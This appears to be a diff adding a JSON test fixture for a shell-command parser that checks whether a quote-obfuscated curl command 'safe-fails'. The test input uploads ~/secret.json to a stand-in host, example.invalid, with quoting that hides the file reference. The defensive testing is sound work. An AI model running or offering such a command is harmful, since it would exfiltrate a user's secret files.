@@ -1,0 +1,69 @@
+{
+  "name": "Curl data transformed literal dynamic",
+  "input": "curl --data=\u0027@~\u0027\u0022/secret.json\u0022 https://example.invalid/api",
+  "expected": {
+    "isUnparseable": false,
+    "clauses": [
+      {
+        "operator": "None",
+        "verb": [
+          "curl"
+        ],
+        "args": [
+          {
+            "raw": "--data",
+            "kind": "Literal",
+            "isPath": false
+          },
+          {
+            "raw": "\u0027@~\u0027\u0022/secret.json\u0022",
+            "kind": "DynamicSkip",
+            "isPath": false
+          },
+          {
+            "raw": "https://example.invalid/api",
+            "kind": "Literal",
+            "isPath": false
+          }
+        ],
+        "redirects": [],
+        "elements": [
+          {
+            "raw": "curl",
+            "value": "curl",
+            "role": "Verb",
+            "sourceStart": 0,
+            "sourceLength": 4,
+            "precedingVerbElementCount": 0,
+            "kind": "Literal",
+            "isFlag": false,
+            "isPath": false
+          },
+          {
+            "raw": "--data=\u0027@~\u0027\u0022/secret.json\u0022",
+            "value": "--data=@~/secret.json",
+            "role": "Argument",
+            "sourceStart": 5,
+            "sourceLength": 25,
+            "precedingVerbElementCount": 1,
+            "kind": "DynamicSkip",
+            "isFlag": true,
+            "isPath": false
+          },
+          {
+            "raw": "https://example.invalid/api",
+            "value": "https://example.invalid/api",
+            "role": "Argument",
+            "sourceStart": 31,
+            "sourceLength": 27,
+            "precedingVerbElementCount": 1,
+            "kind": "Literal",
+            "isFlag": false,
+            "isPath": false
+          }
+        ]
+      }
+    ]
+  },
+  "notes": "Resolver-sensitive syntax exposed after curl\u0027s @ marker is removed still safe-fails."
+}
